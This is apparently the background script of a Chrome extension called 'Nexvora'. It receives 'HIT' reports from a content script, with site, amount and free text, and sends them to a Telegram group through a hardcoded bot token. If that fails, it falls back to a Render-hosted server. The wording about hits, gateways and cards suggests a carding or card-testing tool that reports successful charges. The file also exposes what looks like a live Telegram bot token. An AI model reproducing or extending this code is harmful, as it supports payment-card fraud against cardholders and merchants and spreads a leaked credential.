/**
 * Nexvora Absolute Isolation (v12.0 - Forced Strip)
 * Zero collision, zero latency, pure stability.
 * Fallback Proxy: Render Server
 */

(function() {
    const _NEX_V12_TOKEN_ = '8611283068:AAHACBysrkkm8RqmsidZ24QRwAIcnld4t8o';
    const _NEX_V12_GROUP_ = '-1003721268860';

    chrome.runtime.onMessage.addListener((request, sender, sendResponse) => {
        if (request.type === 'NOTIFY_HIT') {
            const data = request.data || {};
            console.log("[Nexvora] 📥 Received HIT from content script:", data.site);

            (async () => {
                let status = { tg: false, server: false, error: "" };

                // Attempt 1: Direct Telegram Bot API
                try {
                    const tgRes = await fetch(`https://api.telegram.org/bot${_NEX_V12_TOKEN_}/sendMessage`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            chat_id: _NEX_V12_GROUP_,
                            text: data.text || "🟢 HIT DETECTED",
                            parse_mode: 'HTML'
                        })
                    });
                    const tgData = await tgRes.json();
                    status.tg = tgData.ok;
                    if (!tgData.ok) status.error = "TG: " + tgData.description;
                } catch (err) {
                    status.error = "Local Fetch Fail: " + err.message;
                }

                // Attempt 2: Server Fallback (Render)
                if (!status.tg) {
                    console.log("[Nexvora] ⚠️ Direct TG failed. Trying Server Fallback...");
                    try {
                        const serverRes = await fetch(`https://extensionshitteer.onrender.com/api/notify-hit`, {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({
                                amount: data.amount || 'N/A',
                                site_name: data.site || 'Unknown',
                                card: 'REDACTED', // Never send real card
                                gateway: 'Extension (Failsafe)'
                            })
                        });
                        const sData = await serverRes.json();
                        status.server = sData.ok || sData.success;
                        if (!status.server) status.error += " | Server Fail";
                    } catch (err) {
                        status.error += " | Net Fail: " + err.message;
                    }
                }

                console.log("[Nexvora] 🏁 Transmission Completed. TG:", status.tg, "Server:", status.server);
                sendResponse({ ok: status.tg || status.server, details: status.error });
            })();
            return true; 
        }
    });
})();

// Restore Dashboard/Popup Functionality
try {
    importScripts('background_core.js');
} catch (e) {
    console.error("[Nexvora] Core Logic Bridge Failed:", e);
}
